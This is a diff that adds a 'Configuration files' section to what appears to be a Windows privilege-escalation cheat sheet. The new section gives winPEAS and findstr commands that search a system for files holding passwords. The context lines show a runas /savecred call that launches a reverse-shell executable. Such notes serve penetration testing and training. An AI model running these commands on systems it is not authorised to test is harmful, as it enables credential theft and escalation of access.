@@ -110,6 +110,19 @@ Exploit:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ````
 
+
+### Configuration files
+
+```
+//Use winPEAS to search for common files which may contain credentials:
+
+.\winPEASany.exe quiet cmd searchfast filesinfo
+
+//Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
+findstr /si password *.xml *.ini *.txt
+
+```
+
 ## Exploits
 
 ### Juicy potato
